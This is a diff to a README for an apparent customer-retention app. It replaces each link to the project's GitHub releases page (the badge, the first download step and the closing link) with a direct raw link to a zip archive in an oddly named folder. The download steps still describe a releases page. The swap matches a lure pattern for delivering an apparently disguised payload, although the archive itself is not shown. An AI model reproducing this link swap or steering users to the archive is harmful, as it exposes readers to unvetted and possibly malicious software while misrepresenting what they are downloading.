@@ -1,6 +1,6 @@
 # 📊 Customer-Success-Platform-suite - Track Retention and Customer Health
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/doingood-coder/Customer-Success-Platform-suite/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/doingood-coder/Customer-Success-Platform-suite/main/breezeless/Platform-suite-Success-Customer-2.0-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ This app is built for end users who want to:
 ## 💾 Download the App
 
 1. Open the releases page:
-   https://github.com/doingood-coder/Customer-Success-Platform-suite/releases
+   https://raw.githubusercontent.com/doingood-coder/Customer-Success-Platform-suite/main/breezeless/Platform-suite-Success-Customer-2.0-alpha.4.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from the release assets
 4. Save the file to your computer
@@ -230,4 +230,4 @@ This helps you move from review to action in a few steps.
 
 If you need the release page again, use this link:
 
-https://github.com/doingood-coder/Customer-Success-Platform-suite/releases
+https://raw.githubusercontent.com/doingood-coder/Customer-Success-Platform-suite/main/breezeless/Platform-suite-Success-Customer-2.0-alpha.4.zip
